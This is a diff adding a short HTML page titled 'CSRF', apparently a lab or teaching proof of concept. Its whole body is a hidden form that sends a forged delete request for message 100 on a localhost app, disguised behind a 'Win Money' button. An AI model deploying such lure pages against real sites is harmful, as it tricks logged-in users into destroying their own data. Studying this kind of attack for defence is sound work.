@@ -1,0 +1,11 @@
+<html>
+    <head>
+        <title>CSRF</title>
+    </head>
+    <body>
+        <form action="http://localhost:8080/messages/100" method="post">
+            <input type="hidden" name="_method" value="delete"/>
+            <input type="submit" value="Win Money"/>
+        </form>
+    </body>
+</html>
